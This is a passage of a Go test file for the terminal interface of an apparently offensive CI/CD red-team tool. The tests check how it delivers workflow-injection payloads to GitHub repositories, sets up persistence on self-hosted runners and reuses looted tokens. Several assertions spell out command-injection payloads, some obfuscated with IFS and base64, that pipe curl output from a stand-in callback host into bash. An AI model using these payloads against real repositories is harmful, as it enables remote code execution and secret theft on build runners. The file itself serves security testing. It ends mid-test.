// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package tui

import (
	"strings"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
	"github.com/boostsecurityio/smokedmeat/internal/counter"
	"github.com/boostsecurityio/smokedmeat/internal/pantry"
)

func newModelForWizardDeploy(t *testing.T, mock *mockKitchenClient) Model {
	t.Helper()
	m := NewModel(Config{
		KitchenURL:         "http://kitchen.local",
		KitchenExternalURL: "https://callback.smokedmeat.local",
		SessionID:          "test-session",
	})
	m.kitchenClient = mock
	m.phase = PhaseWizard
	return m
}

func observedSelfHostedRunnerPantry(t *testing.T) *pantry.Pantry {
	t.Helper()

	p := pantry.New()
	repo := pantry.NewRepository("acme", "api", "github")
	workflow := pantry.NewWorkflow(repo.ID, ".github/workflows/pr.yml")
	job := pantry.NewJob(workflow.ID, "build")
	job.SetProperty("self_hosted", true)
	job.SetProperty("runs_on", []string{"self-hosted", "linux", "x64"})

	require.NoError(t, p.AddAsset(repo))
	require.NoError(t, p.AddAsset(workflow))
	require.NoError(t, p.AddAsset(job))
	require.NoError(t, p.AddRelationship(repo.ID, workflow.ID, pantry.Contains()))
	require.NoError(t, p.AddRelationship(workflow.ID, job.ID, pantry.Contains()))
	assert.Equal(t, 1, pantry.SyncObservedSelfHostedRunnerTargets(p))

	return p
}

func TestExecuteWizardDeployment_NilWizard(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.wizard = nil

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.NotEqual(t, PhaseWizard, model.phase)
}

func TestExecuteWizardDeployment_AutoPR_Success(t *testing.T) {
	mock := &mockKitchenClient{
		deployPRResp: counter.DeployPRResponse{PRURL: "https://github.com/acme/api/pull/1"},
	}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT, Scopes: []string{"repo"}}
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", Workflow: "ci.yml", Context: "pr_body", ID: "V001"}
	m.wizard.DeliveryMethod = DeliveryAutoPR
	m.wizard.Step = 3

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
	assert.Nil(t, model.waiting)
}

func TestExecuteWizardDeployment_AutoPR_NoToken(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = nil
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", ID: "V001"}
	m.wizard.DeliveryMethod = DeliveryAutoPR

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.Nil(t, cmd)
	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-1].Content, "GitHub token not set")
}

func TestExecuteWizardDeployment_Issue_Success(t *testing.T) {
	mock := &mockKitchenClient{
		deployIssueResp: counter.DeployIssueResponse{IssueURL: "https://github.com/acme/api/issues/1"},
	}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = &TokenInfo{Value: "ghp_test"}
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", Workflow: "ci.yml", Context: "issue_body", ID: "V002"}
	m.wizard.DeliveryMethod = DeliveryIssue

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
}

func TestExecuteWizardDeployment_Comment_Success(t *testing.T) {
	mock := &mockKitchenClient{
		deployCommentResp: counter.DeployCommentResponse{CommentURL: "https://github.com/acme/api/issues/5#issuecomment-1"},
	}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = &TokenInfo{Value: "ghp_test"}
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", Workflow: "ci.yml", Context: "issue_comment", ID: "V003"}
	m.wizard.DeliveryMethod = DeliveryComment
	m.wizardInput.SetValue("5")

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
	cmd()
	assert.Equal(t, "issue", mock.lastDeployCommentReq.Target)
	assert.Contains(t, mock.lastDeployCommentReq.Payload, "$(curl -s https://callback.smokedmeat.local/r/smokedmeat/")
	assert.Contains(t, mock.lastDeployCommentReq.Payload, "#'; curl -s https://callback.smokedmeat.local/r/smokedmeat/")
}

func TestExecuteWizardDeployment_Comment_PrefersBashContext(t *testing.T) {
	mock := &mockKitchenClient{
		deployCommentResp: counter.DeployCommentResponse{CommentURL: "https://github.com/acme/api/issues/5#issuecomment-1"},
	}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = &TokenInfo{Value: "ghp_test"}
	m.wizard.SelectedVuln = &Vulnerability{
		Repository:  "acme/api",
		Workflow:    "ci.yml",
		Context:     "comment_body",
		BashContext: "bash_unquoted",
		ID:          "V003",
	}
	m.wizard.DeliveryMethod = DeliveryComment
	m.wizardInput.SetValue("5")

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
	cmd()
	assert.Contains(t, mock.lastDeployCommentReq.Payload, "$(curl -s https://callback.smokedmeat.local/r/smokedmeat/")
	assert.NotContains(t, mock.lastDeployCommentReq.Payload, "#'; curl -s https://callback.smokedmeat.local/r/smokedmeat/")
}

func TestVulnerabilityCanAttemptPersistence_SelfHostedBashNoGate(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.pantry = observedSelfHostedRunnerPantry(t)

	vuln := &Vulnerability{
		Repository:  "acme/api",
		Workflow:    ".github/workflows/pr.yml",
		Job:         "build",
		Context:     "issue_body",
		BashContext: "bash_unquoted",
	}

	assert.True(t, m.vulnerabilityCanAttemptPersistence(vuln))
}

func TestVulnerabilityCanAttemptPersistence_RejectsGateTriggers(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.pantry = observedSelfHostedRunnerPantry(t)

	vuln := &Vulnerability{
		Repository:   "acme/api",
		Workflow:     ".github/workflows/pr.yml",
		Job:          "build",
		Context:      "issue_body",
		BashContext:  "bash_unquoted",
		GateTriggers: []string{"/deploy"},
	}

	assert.False(t, m.vulnerabilityCanAttemptPersistence(vuln))
}

func TestToggleWizardPersistenceAttempt_ClearsManualPayloadPreview(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.pantry = observedSelfHostedRunnerPantry(t)
	m.wizard = &WizardState{}
	m.wizard.Reset()
	m.wizard.Kind = WizardKindVulnerability
	m.wizard.DeliveryMethod = DeliveryManualSteps
	m.wizard.SelectedVuln = &Vulnerability{
		Repository:  "acme/api",
		Workflow:    ".github/workflows/pr.yml",
		Job:         "build",
		Context:     "issue_body",
		BashContext: "bash_unquoted",
	}
	m.wizard.Payload = "stale-preview"

	m.toggleWizardPersistenceAttempt()

	assert.True(t, m.wizard.PersistenceAttempt)
	assert.Empty(t, m.wizard.Payload)
}

func TestBuildRunnerTargetCallbackScript_UsesStandaloneShell(t *testing.T) {
	script := buildRunnerTargetCallbackScript("https://callback.smokedmeat.local/r/smokedmeat/stg1", false)

	assert.Contains(t, script, `curl -fsSL "https://callback.smokedmeat.local/r/smokedmeat/stg1" | bash`)
	assert.NotContains(t, script, "$(")
	assert.NotContains(t, script, persistenceEnvKey)
}

func TestBuildRunnerTargetCallbackScript_PersistentSetsPersistEnvOnBash(t *testing.T) {
	script := buildRunnerTargetCallbackScript("https://callback.smokedmeat.local/r/smokedmeat/stg1", true)

	assert.Contains(t, script, `curl -fsSL "https://callback.smokedmeat.local/r/smokedmeat/stg1" | `+persistenceEnvKey+`=1 bash`)
	assert.NotContains(t, script, "$(")
}

func TestDecoratePayloadForPersistence_UsesBashEnvAssignment(t *testing.T) {
	payload := "$(curl -s https://callback.smokedmeat.local/r/smokedmeat/stg1|bash)"

	decorated := decoratePayloadForPersistence(payload)

	assert.Equal(t, "$(curl -s https://callback.smokedmeat.local/r/smokedmeat/stg1|"+persistenceEnvKey+"=1 bash)", decorated)
}

func TestDecoratePayloadForPersistence_PreservesIFSSpacing(t *testing.T) {
	payload := "$(curl${IFS}-s${IFS}$(base64${IFS}-d<<<'aHR0cHM6Ly9jYWxsYmFjay5zbW9rZWRtZWF0LmxvY2FsL3Ivc21va2VkbWVhdC9zdGcx')|bash)"

	decorated := decoratePayloadForPersistence(payload)

	assert.Equal(t, "$(curl${IFS}-s${IFS}$(base64${IFS}-d<<<'aHR0cHM6Ly9jYWxsYmFjay5zbW9rZWRtZWF0LmxvY2FsL3Ivc21va2VkbWVhdC9zdGcx')|"+persistenceEnvKey+"=1${IFS}bash)", decorated)
}

func TestExecuteRunnerTargetWizardAction_PersistentCallbackStartsWaiting(t *testing.T) {
	mock := &mockKitchenClient{
		registerCallbackResp: &counter.RegisterCallbackResponse{
			Callback: &counter.CallbackPayload{
				ID:         "cb-runner-1",
				Persistent: true,
				Metadata: map[string]string{
					"callback_label": "Self-hosted runner - .github/workflows/smokedmeat-self-hosted.yml",
					"workflow":       runnerTargetWorkflowPath(),
					"job":            runnerTargetWorkflowJobName(),
				},
			},
		},
	}
	m := newModelForWizardDeploy(t, mock)
	m.wizard.Reset()
	m.wizard.Kind = WizardKindRunnerTarget
	m.wizard.Step = 3
	m.wizard.RunnerTargetAction = RunnerTargetActionCopyWorkflow
	m.wizard.PersistenceAttempt = true
	m.wizard.DwellTime = 2 * time.Minute
	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
		Repository:            "acme/api",
		LabelDisplay:          "linux-x64 +dynamic",
		LabelSet:              []string{"self-hosted", "linux", "x64"},
		DynamicLabelSet:       []string{"${{ needs.bootstrap.outputs.runner_label }}"},
		ObservedWorkflowPaths: []string{".github/workflows/pr.yml"},
		ObservedJobNames:      []string{"build"},
	}

	result, cmd := m.executeRunnerTargetWizardAction()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, PhaseWaiting, model.phase)
	require.NotNil(t, model.waiting)
	assert.Equal(t, mock.lastRegisterCallbackID, model.waiting.StagerID)
	assert.Equal(t, "acme/api", model.waiting.TargetRepo)
	assert.Equal(t, runnerTargetWorkflowPath(), model.waiting.TargetWorkflow)
	assert.Equal(t, runnerTargetWorkflowJobName(), model.waiting.TargetJob)
	assert.Equal(t, 2*time.Minute, model.waiting.DwellTime)
	require.Len(t, model.callbacks, 1)
	assert.Equal(t, "Self-hosted runner - .github/workflows/smokedmeat-self-hosted.yml", model.callbacks[0].Metadata["callback_label"])
	assert.Equal(t, runnerTargetWorkflowPath(), model.callbacks[0].Metadata["workflow"])
	assert.Equal(t, runnerTargetWorkflowJobName(), model.callbacks[0].Metadata["job"])
	assert.True(t, mock.lastRegisterCallbackReq.Persistent)
	assert.Equal(t, "self_hosted_runner", mock.lastRegisterCallbackReq.Metadata["callback_kind"])
	assert.Equal(t, "resident", mock.lastRegisterCallbackReq.Metadata["persistence_mode"])
}

func TestAdvanceRunnerTargetWizardStep_WeakAutoWorkflowPushStillShowsStep3(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.tokenInfo = &TokenInfo{Value: "ghs_app_token", Type: TokenTypeInstallApp, Source: "loot:APP_TOKEN_whooli"}
	m.appTokenPermissions = map[string]string{
		"contents": "read",
	}
	m.wizard.Reset()
	m.wizard.Kind = WizardKindRunnerTarget
	m.wizard.Step = 2
	m.wizard.RunnerTargetAction = RunnerTargetActionAutoWorkflowPush
	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
		Repository:   "whooli/infrastructure-definitions",
		LabelDisplay: "linux-x64",
		LabelSet:     []string{"self-hosted", "linux", "x64"},
	}

	result, cmd := m.advanceRunnerTargetWizardStep()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 3, model.wizard.Step)
}

func TestHandleRunnerTargetWizardKeyMsg_PersistentAutoWorkflowPushIgnoresDwellAndBudgetKeys(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard.Reset()
	m.wizard.Kind = WizardKindRunnerTarget
	m.wizard.Step = 3
	m.wizard.RunnerTargetAction = RunnerTargetActionAutoWorkflowPush
	m.wizard.PersistenceAttempt = true
	m.wizard.DwellTime = 2 * time.Minute
	m.wizard.CallbackBudget = 3

	result, cmd := m.handleRunnerTargetWizardKeyMsg(tea.KeyPressMsg{Text: "d", Code: 'd'})
	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 2*time.Minute, model.wizard.DwellTime)
	assert.Equal(t, 3, model.wizard.CallbackBudget)

	result, cmd = model.handleRunnerTargetWizardKeyMsg(tea.KeyPressMsg{Text: "b", Code: 'b'})
	model = result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 2*time.Minute, model.wizard.DwellTime)
	assert.Equal(t, 3, model.wizard.CallbackBudget)
}

func TestExecuteRunnerTargetWizardAction_AutoWorkflowPushUsesKitchenDeploy(t *testing.T) {
	mock := &mockKitchenClient{
		deploySelfHostedWorkflowPushResp: counter.DeploySelfHostedWorkflowPushResponse{
			Branch:    "smokedmeat-runner-123",
			BranchURL: "https://github.com/acme/api/tree/smokedmeat-runner-123",
		},
	}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = &TokenInfo{
		Value:  "ghs_app_token",
		Type:   TokenTypeInstallApp,
		Source: "loot:APP_TOKEN_acme",
		Owner:  "acme",
	}
	m.appTokenPermissions = map[string]string{
		"contents":  "write",
		"workflows": "write",
	}
	m.wizard.Reset()
	m.wizard.Kind = WizardKindRunnerTarget
	m.wizard.Step = 3
	m.wizard.RunnerTargetAction = RunnerTargetActionAutoWorkflowPush
	m.wizard.DwellTime = 2 * time.Minute
	m.wizard.Preflight = &counter.DeployPreflightResponse{
		Capabilities: map[string]counter.DeployPreflightCapability{
			deployCapabilityWorkflowPush: {State: deployStatePass},
		},
	}
	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
		Repository:            "acme/api",
		LabelDisplay:          "linux-x64",
		LabelSet:              []string{"self-hosted", "linux", "x64"},
		ObservedWorkflowPaths: []string{".github/workflows/pr.yml"},
		ObservedJobNames:      []string{"build"},
	}

	result, cmd := m.executeRunnerTargetWizardAction()

	model := result.(Model)
	require.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
	assert.Nil(t, model.wizard.Preflight)
	msg := cmd()
	success, ok := msg.(RunnerTargetWorkflowPushSuccessMsg)
	require.True(t, ok)
	assert.Equal(t, "https://github.com/acme/api/tree/smokedmeat-runner-123", success.BranchURL)
	assert.Equal(t, "acme/api", mock.lastDeploySelfHostedWorkflowReq.RepoName)
	assert.NotEmpty(t, mock.lastDeploySelfHostedWorkflowReq.Branch)
	assert.Equal(t, runnerTargetWorkflowPath(), mock.lastDeploySelfHostedWorkflowReq.Path)
	assert.Contains(t, mock.lastDeploySelfHostedWorkflowReq.Content, "runs-on:")
	assert.Contains(t, mock.lastDeploySelfHostedWorkflowReq.Content, "  push:")
}

func TestExecuteRunnerTargetWizardAction_AutoWorkflowPushUsesSSHWhenAvailable(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.wizard.Reset()
	m.wizard.Kind = WizardKindRunnerTarget
	m.wizard.Step = 3
	m.wizard.RunnerTargetAction = RunnerTargetActionAutoWorkflowPush
	m.wizard.DwellTime = 90 * time.Second
	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
		Repository:            "acme/api",
		LabelDisplay:          "linux-x64",
		LabelSet:              []string{"self-hosted", "linux", "x64"},
		ObservedWorkflowPaths: []string{".github/workflows/pr.yml"},
		ObservedJobNames:      []string{"build"},
	}
	m.sshState = &SSHState{
		KeyName:  "DEPLOY_KEY",
		KeyValue: "-----BEGIN OPENSSH PRIVATE KEY-----\nkey\n-----END OPENSSH PRIVATE KEY-----",
		Results: []SSHTrialResult{
			{Repo: "acme/api", Success: true, Permission: "write"},
		},
	}

	original := pushRunnerTargetWorkflowViaSSHFn
	t.Cleanup(func() { pushRunnerTargetWorkflowViaSSHFn = original })
	pushRunnerTargetWorkflowViaSSHFn = func(_ *SSHState, repo, branchName, workflowPath, workflowYAML, _ string) (string, string, error) {
		assert.Equal(t, "acme/api", repo)
		assert.NotEmpty(t, branchName)
		assert.Equal(t, runnerTargetWorkflowPath(), workflowPath)
		assert.Contains(t, workflowYAML, "  push:")
		return "smokedmeat-runner-ssh", "https://github.com/acme/api/tree/smokedmeat-runner-ssh", nil
	}

	result, cmd := m.executeRunnerTargetWizardAction()

	model := result.(Model)
	require.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
	msg := cmd()
	success, ok := msg.(RunnerTargetWorkflowPushSuccessMsg)
	require.True(t, ok)
	assert.Equal(t, "ssh", success.Route)
	assert.Equal(t, "https://github.com/acme/api/tree/smokedmeat-runner-ssh", success.BranchURL)
	assert.Empty(t, mock.lastDeploySelfHostedWorkflowReq.RepoName)
}

func TestBuildRunnerTargetCallbackWorkflow_MixedDynamicLabelsOmitDynamic(t *testing.T) {
	target := &RunnerTargetSelection{
		Repository:      "acme/api",
		LabelSet:        []string{"self-hosted", "linux", "x64"},
		DynamicLabelSet: []string{"${{ needs.bootstrap.outputs.runner_label }}"},
	}

	workflow := buildRunnerTargetCallbackWorkflow(target, "echo callback")

	assert.Contains(t, workflow, `      - "self-hosted"`)
	assert.Contains(t, workflow, `      - "linux"`)
	assert.Contains(t, workflow, `      - "x64"`)
	assert.NotContains(t, workflow, "needs.bootstrap.outputs.runner_label")
}

func TestExecuteRunnerTargetWizardAction_DynamicOnlyLabelsBlockGeneratedWorkflow(t *testing.T) {
	mock := &mockKitchenClient{
		registerCallbackResp: &counter.RegisterCallbackResponse{},
	}
	m := newModelForWizardDeploy(t, mock)
	m.wizard.Reset()
	m.wizard.Kind = WizardKindRunnerTarget
	m.wizard.Step = 3
	m.wizard.RunnerTargetAction = RunnerTargetActionAutoWorkflowPush
	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT, Scopes: []string{"repo", "workflow"}}
	m.wizard.Preflight = &counter.DeployPreflightResponse{
		Capabilities: map[string]counter.DeployPreflightCapability{
			deployCapabilityWorkflowPush: {State: deployStatePass},
		},
	}
	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
		Repository:      "acme/api",
		LabelDisplay:    "dynamic",
		DynamicLabelSet: []string{"${{ needs.bootstrap.outputs.runner_label }}"},
	}

	result, cmd := m.executeRunnerTargetWizardAction()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, PhaseWizard, model.phase)
	assert.Empty(t, mock.lastRegisterCallbackID)
	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-1].Content, "uses only dynamic labels")
}

func TestExecuteRunnerTargetWizardAction_UnsafeStaticLabelBlocksGeneratedWorkflow(t *testing.T) {
	mock := &mockKitchenClient{
		registerCallbackResp: &counter.RegisterCallbackResponse{},
	}
	m := newModelForWizardDeploy(t, mock)
	m.wizard.Reset()
	m.wizard.Kind = WizardKindRunnerTarget
	m.wizard.Step = 3
	m.wizard.RunnerTargetAction = RunnerTargetActionCopyWorkflow
	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
		Repository:   "acme/api",
		LabelDisplay: "unsafe",
		LabelSet:     []string{"self-hosted", "linux: x64"},
	}

	result, cmd := m.executeRunnerTargetWizardAction()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, PhaseWizard, model.phase)
	assert.Empty(t, mock.lastRegisterCallbackID)
	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-1].Content, "not safe for generated YAML")
}

func TestExecuteWizardDeployment_Comment_InvalidIssueNum(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = &TokenInfo{Value: "ghp_test"}
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", ID: "V003"}
	m.wizard.DeliveryMethod = DeliveryComment
	m.wizardInput.SetValue("abc")

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.Nil(t, cmd)
	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-1].Content, "Invalid issue/PR number")
}

func TestExecuteWizardDeployment_Comment_StubPRSuccess(t *testing.T) {
	mock := &mockKitchenClient{
		deployCommentResp: counter.DeployCommentResponse{CommentURL: "https://github.com/acme/api/pull/5#issuecomment-1"},
	}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = &TokenInfo{Value: "ghp_test"}
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", Workflow: "ci.yml", Context: "issue_comment", ID: "V003"}
	m.wizard.DeliveryMethod = DeliveryComment
	m.wizard.CommentTarget = CommentTargetStubPullRequest
	m.wizard.AutoClose = boolPtr(true)

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
	cmd()
	assert.Equal(t, "stub_pull_request", mock.lastDeployCommentReq.Target)
	require.NotNil(t, mock.lastDeployCommentReq.AutoClose)
	assert.True(t, *mock.lastDeployCommentReq.AutoClose)
}

func TestExecuteWizardDeployment_LOTP_Success(t *testing.T) {
	mock := &mockKitchenClient{
		deployLOTPResp: counter.DeployLOTPResponse{PRURL: "https://github.com/acme/api/pull/2"},
	}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = &TokenInfo{Value: "ghp_test"}
	m.wizard.SelectedVuln = &Vulnerability{
		Repository:  "acme/api",
		LOTPTool:    "bash",
		LOTPTargets: []string{"scripts/build.sh"},
		RuleID:      "untrusted_checkout_exec",
		ID:          "V004",
	}
	m.wizard.DeliveryMethod = DeliveryLOTP

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
}

func TestExecuteWizardDeployment_LOTPUnsupportedAutoGenerationBlocked(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = &TokenInfo{Value: "ghp_test"}
	m.wizard.SelectedVuln = &Vulnerability{
		Repository: "acme/api",
		LOTPAction: "actions/setup-go",
		RuleID:     "untrusted_checkout_exec",
		ID:         "V004",
	}
	m.wizard.DeliveryMethod = DeliveryLOTP

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.Nil(t, cmd)
	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-1].Content, "actions/setup-go")
}

func TestExecuteWizardDeployment_CopyOnly(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", Context: "pr_body", ID: "V005"}
	m.wizard.DeliveryMethod = DeliveryCopyOnly

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.NotEqual(t, PhaseWizard, model.phase)
	hasPayloadOutput := false
	for _, line := range model.output {
		if line.Type == "output" && line.Content != "" {
			hasPayloadOutput = true
			break
		}
	}
	assert.True(t, hasPayloadOutput, "Should have payload in output")
}

func TestExecuteWizardDeployment_CopyOnly_ShowsCallbackBudgetInModeLabel(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", Context: "pr_body", ID: "V005"}
	m.wizard.DeliveryMethod = DeliveryCopyOnly
	m.wizard.DwellTime = 30 * time.Second
	m.wizard.CallbackBudget = 3

	result, _ := m.executeWizardDeployment()
	model := result.(Model)

	require.NotEmpty(t, model.output)
	found := false
	for _, line := range model.output {
		if line.Type == "muted" && strings.Contains(line.Content, "Mode: dwell 30s, 3 callbacks") {
			found = true
			break
		}
	}
	assert.True(t, found)
}

func TestExecuteWizardDeployment_ManualSteps(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", Context: "pr_body", ID: "V006"}
	m.wizard.DeliveryMethod = DeliveryManualSteps

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.NotEqual(t, PhaseWizard, model.phase)
	hasPayloadOutput := false
	for _, line := range model.output {
		if line.Type == "output" && line.Content != "" {
			hasPayloadOutput = true
			break
		}
	}
	assert.True(t, hasPayloadOutput, "Should have payload in output")
}

func TestExecuteWizardDeployment_AutoDispatch_NoToken(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", Workflow: "ci.yml", ID: "V007"}
	m.wizard.DeliveryMethod = DeliveryAutoDispatch

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.Nil(t, cmd)
	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-2].Content, "No token with workflow_dispatch permission is ready")
}

func TestExecuteWizardDeployment_AutoDispatch_UsesActiveSessionToken(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.jobDeadline = time.Now().Add(2 * time.Minute)
	m.sessionLoot = []CollectedSecret{{
		Name:      "GITHUB_TOKEN",
		Value:     "ghs_live123",
		Ephemeral: true,
		Type:      "github_token",
	}}
	m.tokenPermissions = map[string]string{"actions": "write"}
	m.wizard.SelectedVuln = &Vulnerability{
		Repository:       "acme/api",
		Workflow:         "ci.yml",
		Context:          "workflow_dispatch_input",
		ID:               "V007",
		InjectionSources: []string{"github.event.inputs.payload"},
	}
	m.wizard.DeliveryMethod = DeliveryAutoDispatch
	m.wizard.Step = 3

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
	assert.Nil(t, model.waiting)
	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-1].Content, "Triggering workflow_dispatch")
}

func TestExecuteWizardDeployment_AutoDispatch_ShowsCallbackBudgetInModeLabel(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.jobDeadline = time.Now().Add(2 * time.Minute)
	m.sessionLoot = []CollectedSecret{{
		Name:      "GITHUB_TOKEN",
		Value:     "ghs_live123",
		Ephemeral: true,
		Type:      "github_token",
	}}
	m.tokenPermissions = map[string]string{"actions": "write"}
	m.wizard.SelectedVuln = &Vulnerability{
		Repository:       "acme/api",
		Workflow:         "ci.yml",
		Context:          "workflow_dispatch_input",
		ID:               "V007",
		InjectionSources: []string{"github.event.inputs.payload"},
	}
	m.wizard.DeliveryMethod = DeliveryAutoDispatch
	m.wizard.Step = 3
	m.wizard.DwellTime = 30 * time.Second
	m.wizard.CallbackBudget = 3

	result, _ := m.executeWizardDeployment()
	model := result.(Model)

	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-1].Content, "dwell 30s, 3 callbacks")
}

func TestExecuteWizardDeployment_AutoDispatch_UsesActiveLootToken(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.jobDeadline = time.Now().Add(2 * time.Minute)
	secret := CollectedSecret{
		Name:      "GITHUB_TOKEN",
		Value:     "ghs_live456",
		Ephemeral: true,
		Type:      "github_token",
		Scopes:    []string{"actions:write", "contents:read"},
	}
	m.swapActiveToken(secret)
	m.wizard.SelectedVuln = &Vulnerability{
		Repository:       "acme/api",
		Workflow:         "ci.yml",
		Context:          "workflow_dispatch_input",
		ID:               "V008",
		InjectionSources: []string{"github.event.inputs.payload"},
	}
	m.wizard.DeliveryMethod = DeliveryAutoDispatch
	m.wizard.Step = 3

	result, cmd := m.executeWizardDeployment()

	model := result.(Model)
	assert.NotNil(t, cmd)
	assert.Equal(t, PhaseRecon, model.phase)
	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-1].Content, "Triggering workflow_dispatch with GITHUB_TOKEN")
}

func TestWizardKeyMsg_CommentIssueNumberAcceptsNumericHotkeys(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{
		Step:           3,
		SelectedVuln:   &Vulnerability{Repository: "acme/api", Context: "issue_comment"},
		DeliveryMethod: DeliveryComment,
	}
	m.wizardInput.Focus()

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Text: "1", Code: '1'})

	model := result.(Model)
	assert.Equal(t, "1", model.wizardInput.Value())
	assert.Equal(t, 3, model.wizard.Step)
}

func TestWizardKeyMsg_CommentIssueNumberStillCyclesDwell(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{
		Step:           3,
		SelectedVuln:   &Vulnerability{Repository: "acme/api", Context: "issue_comment"},
		DeliveryMethod: DeliveryComment,
		DwellTime:      0,
	}
	m.wizardInput.Focus()

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'd'})

	model := result.(Model)
	assert.Equal(t, 30*time.Second, model.wizard.DwellTime)
	assert.Equal(t, "", model.wizardInput.Value())
}

func TestWizardKeyMsg_CommentIssueNumberStillTogglesCachePoison(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository:         "acme/api",
			Context:            "issue_comment",
			CachePoisonWriter:  true,
